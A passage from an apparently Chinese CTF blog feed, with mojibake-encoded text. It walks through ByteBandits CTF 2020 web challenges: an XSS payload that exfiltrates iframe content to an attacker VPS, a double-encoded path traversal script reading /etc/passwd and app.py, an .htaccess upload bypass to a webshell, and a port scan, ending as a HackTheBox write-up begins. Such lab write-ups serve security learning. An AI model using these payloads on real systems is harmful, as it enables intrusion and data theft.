æ­¤éœ€è¦é¢å¤–è®¾è®¡ï¼Œæ¯”å¦‚èµ·ä¸€ä¸ªflaskæ§åˆ¶botè®¿é—®æ—¶è¿›è¡Œåœé¡¿ï¼Œè¿™æ ·å°±æœ‰æ—¶é—´è§¦å‘payloadäº†ã€‚<br>ä¸‹é¢æ˜¯dalaoçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler,HTTPServer</span><br><span class="line"></span><br><span class="line">PORT_NUMBER = <span class="number">8877</span></span><br><span class="line"></span><br><span class="line">SERVER = <span class="string">"https://notes.web.byteband.it"</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">"abc"</span></span><br><span class="line">PASSWORD = <span class="string">"123"</span></span><br><span class="line"></span><br><span class="line">EXPLOIT = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;script type='text/javascript'&gt;</span></span><br><span class="line"><span class="string">function loginUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/login?username=&#123;username&#125;&amp;password=&#123;password&#125;";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function logoutUser() &#123;&#123;</span></span><br><span class="line"><span class="string">    var iframe = document.createElement('iframe');</span></span><br><span class="line"><span class="string">    iframe.style.display = "none";</span></span><br><span class="line"><span class="string">    iframe.onload = loginUser;</span></span><br><span class="line"><span class="string">    iframe.src = "&#123;server&#125;/logout";</span></span><br><span class="line"><span class="string">    iframe.sandbox = "allow-same-origin allow-scripts";</span></span><br><span class="line"><span class="string">    document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">&#125;&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;iframe id="iframe01" name="iframe01" src="&#123;server&#125;/profile" sandbox="allow-same-origin allow-scripts" onload="logoutUser(this)"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">"""</span>.format(server=SERVER, username=USERNAME, password=PASSWORD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">"Content-type"</span>, <span class="string">"text/html"</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(EXPLOIT.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        time.sleep(<span class="number">10</span>)  <span class="comment"># keep open for some time for exploit to finish</span></span><br><span class="line"></span><br><span class="line">myServer = HTTPServer((<span class="string">"0.0.0.0"</span>, PORT_NUMBER), MyServer)</span><br><span class="line">print(time.asctime(), <span class="string">"Server Starts - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    myServer.serve_forever()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">myServer.server_close()</span><br><span class="line">print(time.asctime(), <span class="string">"Server Stops - %s:%s"</span> % (<span class="string">"0.0.0.0"</span>, PORT_NUMBER))</span><br></pre></td></tr></table></figure><p>ä»è¿™è¡Œä»£ç å°±èƒ½çœ‹å‡ºä¸»è¦æµç¨‹è·Ÿä¹‹å‰æ„æ€çš„æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚<br><code>&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;</code><br>ä¸»è¦å°±æ˜¯è¦sleep10s.<br>åœ¨vpsä¸Šè¿è¡Œã€‚ç„¶åæˆ‘ä»¬ç”¨è‡ªå·±çš„abcç”¨æˆ·updatepayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;(new Image).src &#x3D; &#39;http:&#x2F;&#x2F;vpsip:port&#x2F;?data&#x3D;&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure><p>èµ·åˆ°çªƒå–iframeå†…å®¹çš„ä½œç”¨,è·å–çš„å†…å®¹æºè‡ªhero-bodyè¿™ä¸ªclassçš„å†…å®¹ã€‚<br>æœ€åurlæäº¤<code>vpsip:port</code>å³å¯<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è§£ç å³å¯å‘ç°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Howdy admin!</span><br><span class="line">flag&#123;ch41n_tHy_3Xploits_t0_w1n&#125;</span><br></pre></td></tr></table></figure><h2 id="ImgAccess2"><a href="#ImgAccess2" class="headerlink" title="ImgAccess2"></a>ImgAccess2</h2><p>è¿™é¢˜å¾ˆæœ‰è¥å…»ã€‚é¦–å…ˆä¸Šæ¥ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚æ ¹æ®é¢˜æ„åªèƒ½æ˜¯å›¾ç‰‡,åŒæ—¶ä¸Šä¼ åè¿›å…¥åˆ°uploadè·¯ç”±,å¹¶èƒ½é€šè¿‡<code>/view/md5.../filename</code>è®¿é—®åˆ°è‡ªå·±çš„å›¾ç‰‡</p><p>é‚£ä¹ˆå½“ç„¶è¦è€ƒè™‘æ–‡ä»¶ä¸Šä¼ getshelläº†ã€‚ä½†æ˜¯é¦–å…ˆæ³¨æ„åˆ°,ä»é¢˜ç›®çš„è·¯ç”±ä¸cookieæ˜æ˜¾æé†’æˆ‘ä»¬è¿™æ˜¯pythonèµ·çš„webæœåŠ¡ã€‚ä½†æ˜¯åŒæ—¶è®¿é—®404æ—¶å‡ºç°çš„æ˜¯ç±»ä¼¼apacheçš„404é¡µé¢</p><p>å¹¶ä¸”è·¯å¾„ä¸Šå‡ºç°çš„æ˜¯/view/xxxxè€Œä¸æ˜¯upload/xxxxx,ä¹Ÿå°±æ„å‘³ç€ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºçœŸæ­£çš„ä¸Šä¼ è·¯å¾„</p><p>å°è¯•upload/xxx/1.jpgå‘ç°è¿”å›404<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯å°†uploadæ”¹ä¸ºuploadsæ—¶å‘ç°å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬çš„ä¸Šä¼ å›¾ç‰‡äº†ã€‚</p><p>å› æ­¤ç¡®å®šï¼ŒçœŸå®çš„ä¸Šä¼ è·¯å¾„æ˜¯uploadsä¸”å¯ä»¥è®¿é—®åˆ°ã€‚<br>æ­¤æ—¶è€ƒè™‘æ˜¯å¦èƒ½åˆ©ç”¨è¿™ä¸ªè·¯å¾„åšäº›æ–‡ç« </p><p>ç›¸å¯¹å®¹æ˜“æƒ³åˆ°çš„åº”è¯¥æ˜¯è·¯å¾„ç©¿è¶Šäº†ï¼Œä½†å°è¯•æ„é€ æ™®é€šè·¯å¾„ç©¿è¶Šå¤±è´¥ã€‚<br>ä¸è¿‡è·¯å¾„ç©¿è¶Šè¿˜æœ‰ä¸€ç§ç›¸å¯¹æ¯”è¾ƒç†Ÿæ‚‰çš„ç»•è¿‡å§¿åŠ¿ã€‚æ¯”å¦‚urlencodeä¸¤æ¬¡çš„è·¯å¾„ç©¿è¶Š,(phpmyadmin4.8.1å°±æ›¾å‡ºç°è¿‡)<br>é‚£ä¹ˆæ­¤å¤„å°è¯•å¯¹è·¯å¾„ç©¿è¶Šè¿›è¡ŒäºŒæ¬¡urlç¼–ç <br><code>../../../../../etc/passwd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://xxxxxxx:7003/uploads/'</span></span><br><span class="line"></span><br><span class="line">filepath=<span class="string">'../../../../../../etc/passwd'</span></span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">filepath=urlencode(filepath)</span><br><span class="line">r=requests.get(url+filepath)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>å‘ç°æˆåŠŸè¯»å–äº†/etc/passwd<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ¥ä¸‹æ¥è‚¯å®šæ˜¯æƒ³è¦å¾—åˆ°å…¶ä»–æœ‰ç”¨ä¿¡æ¯äº†ï¼Œæ¯”å¦‚app.pyçš„æºç <br>æƒ³å…ˆè¯»<code>/proc/self/environ</code>,å‘ç°æ²¡å†…å®¹ã€‚ä½†æ˜¯ä¸è¦ç´§ï¼Œæ­¤æ—¶å¿…ç„¶å¯è¡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨<code>/proc/self/cwd</code>æŒ‡å‘å½“å‰å·¥ä½œç›®å½•çš„ç‰¹æ€§ï¼Œç›´æ¥è¯»å–app.py<br><code>/proc/self/cwd/app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line"><span class="comment"># app.config['UPLOAD_FOLDER'] = "/uploads"</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'s'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">    os.mkdir(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r"(\.\.|/)"</span>, <span class="string">""</span>, filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    caption = request.form[<span class="string">"caption"</span>]</span><br><span class="line">    file = request.files[<span class="string">"image"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">        flash(<span class="string">'Please upload images only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.headers.get(<span class="string">"X-Real-IP"</span>):</span><br><span class="line">           ip = request.remote_addr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           ip = request.headers.get(<span class="string">"X-Real-IP"</span>)</span><br><span class="line">        dirname = md5(ip.encode()).hexdigest()</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>, path = os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/view/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>, path = path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="comment"># TODO(noob):</span></span><br><span class="line">    <span class="comment"># zevtnax told me use apache for static files. I've</span></span><br><span class="line">    <span class="comment"># already configured it to serve /uploads_apache but it</span></span><br><span class="line">    <span class="comment"># still needs testing. I'm a security noob anyways.</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>å‘ç°å‡ ä¸ªä¿¡æ¯ã€‚é¦–å…ˆæ˜¯uploadsè·¯ç”±é‡Œå­˜åœ¨æ˜æ˜¾çš„æç¤ºã€‚æš—ç¤ºæˆ‘ä»¬/uploads_apache/è·¯å¾„</p><p>ç„¶åæ˜¯æ–‡ä»¶åçš„æ£€æŸ¥ã€‚å¾ˆå¥‡æ€ªçš„æ˜¯æ–‡ä»¶åçš„ç™½åå•é‡Œæœ‰ä¸ªs.ä¹‹åå…ˆè°ƒç”¨<code>allowed_file()</code>è¿›è¡Œæ–‡ä»¶åç¼€æ£€æŸ¥ï¼Œç„¶åè°ƒç”¨<code>secure_filename()</code>è¿›è¡Œæ–‡ä»¶åæ£€æŸ¥<br>ç¬¬ä¸€ä¸ªå‡½æ•°åªæ£€æŸ¥æœ€åä¸€ä¸ª<code>.</code>åçš„åç¼€ã€‚è€Œç¬¬äºŒä¸ªå‡½æ•°å°†<code>..</code>æ›¿æ¢ä¸ºç©º<br>é‚£ä¹ˆè¿™å¿…ç„¶å­˜åœ¨ç»•è¿‡.è”ç³»åˆ°è¿™æ˜¯ä¸€ä¸ªapacheæœåŠ¡å™¨,ä¸”åªå…è®¸å›¾ç‰‡ä¸Šä¼ ã€‚è€ƒè™‘ä¸Šä¼ <code>.htaccess</code>è¿›è¡Œgetshell<br>åŒæ—¶ä¸ºäº†ç»•è¿‡æ–‡ä»¶åï¼Œä½¿ç”¨<code>.htacces..s</code><br>ç¬¬ä¸€ä¸ªå‡½æ•°æ£€æŸ¥æ—¶åˆ¤å®šåç¼€ä¸ºs,åœ¨ç™½åå•å†…ã€‚<br>ç¬¬äºŒä¸ªå‡½æ•°å°†..æ›¿æ¢ä¸ºç©ºï¼ŒæˆåŠŸè¾¾åˆ°ä¸Šä¼ <code>.htaccess</code>çš„æ•ˆæœ</p><p>å†…å®¹<br><code>addtype application/x-httpd-php .jpg</code><br>æˆåŠŸä¸Šä¼ ,ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬getshellã€‚</p><p>getshellåå‘ç°æ²¡æœ‰flag.æ¯”èµ›æ—¶é¢˜ç›®æœ‰æç¤ºflagåœ¨secretserver:1337ã€‚æ‰€ä»¥æ–¹ä¾¿ç›´æ¥ä¸‹æ‰‹ã€‚é¶æœºæ²¡æœ‰curlï¼Œé‚£å°±ç›´æ¥wgetå³å¯ã€‚</p><p>ä¸è¿‡å°±ç®—ä¸çŸ¥é“æç¤ºä¹Ÿå¯ä»¥åšï¼Œå®¹å™¨é‡Œæœ‰python3ï¼Œé‚£å°±è‚¯å®šå¯ä»¥æ¢æµ‹ç«¯å£<br>ä»/etc/hostså¾—çŸ¥ipä¸º192.168.128.2.é‚£å°±é¡ºç€æ¢å§ã€‚<br>ç”¨ä¸Šå¿˜è®°ä»å“ªä½å¤§ä½¬é‚£å«–æ¥çš„è„šæœ¬ï¼Œåšbuuæ—¶ç”¨è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'192.168.128.3'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å‘ç°1337ç«¯å£å¼€æ”¾ã€‚<br>å…ˆ<code>wget 192.168.128.3:1337</code>å¾—åˆ°index.html<br>å…¶ä¸­å†…å®¹æç¤ºäº†./flag.txt<br>ç›´æ¥<code>wget 192.168.128.3:1337/flag.txt</code>å³å¯<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag0.PNG" class="lazyload" data-srcset="flag0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/" target="_blank" rel="noopener">https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Sniper--åˆå°windowsé¶æœº</title>
      <link href="2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/"/>
      <url>2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡åšhtbçš„é¶æœºï¼Œè¿™æ¬¡åˆè·Ÿç€ç€å¤§ä½¬çš„æ€è·¯å»åšäº†ä¸€å°æ–°çš„é¶æœºã€‚ä¸åŒä»¥å¾€çš„æ˜¯,è¿™æ¬¡çš„é¶æœºSniperæ˜¯windowsé¶æœºï¼Œå› æ­¤ä¹Ÿæ”¶è·äº†è®¸å¤šæ–°å§¿åŠ¿ã€‚å°±æ˜¯åœ¨ä¸­é—´ä»githubä¸‹äº†ä¸å°‘ä¸œè¥¿â€¦â€¦å› ä¸ºä¸æ˜¯å‡æœŸï¼Œå…·ä½“è¿‡ç¨‹ä¸ä¼šåƒä»¥å¾€é‚£ä¹ˆè¯¦ç»†ã€‚åŒæ—¶windowsé¶æœºä¸‹è‡ªå·±ä¸å¤ªç†è§£çš„ä¸œè¥¿ä¹Ÿå¸Œæœ›ä¸ä¼šç»™åˆ«äººå¸¦è¿›è¯¯åŒºã€‚<br>æœ‰è¶£çš„æ˜¯,è¿™å°é¶æœºè·å¾—webrootçš„shellæœ‰ä¸åŒçš„æ“ä½œæ–¹æ³•ï¼ŒåŒæ—¶å…·ä½“åé¢ææƒæ—¶ä¹Ÿå°†æœ‰ä¸åŒçš„æ–¹æ³•è¿›è¡Œç»†èŠ‚ä¸Šä¸åŒçš„æ“ä½œã€‚å…·ä½“ç»†èŠ‚å°†åœ¨åé¢çš„æ–‡ç« ä¸­æåˆ°ã€‚</p><a id="more"></a><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" class="lazyload" data-srcset="-1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ”»å‡»æœºipï¼š kalilinux 10.10.15.189<br>é¶æœºip windows10 10.10.10.151 </p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>é¦–å…ˆæ˜¯è€å¥—çš„ç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 